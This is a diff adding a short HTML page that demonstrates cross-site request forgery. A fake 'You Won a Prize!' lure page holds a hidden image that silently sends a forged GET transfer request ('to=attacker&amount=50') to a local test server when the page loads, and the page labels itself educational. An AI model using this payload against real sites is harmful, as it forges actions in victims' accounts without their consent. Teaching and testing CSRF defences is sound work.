@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CSRF GET Demo</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <h1>You Won a Prize!</h1>
+  <p>Congratulations! Click <a href="#">here</a> to claim your reward.</p>
+  <!-- Hidden image automatically triggers the forged GET request -->
+  <img src="http://localhost:3000/transfer?to=attacker&amount=50" alt="" style="display:none;">
+  <p style="font-size:small; color:#555;">(Educational CSRF demonstration – the image above silently sends a GET request.)</p>
+</body>
+</html>
+
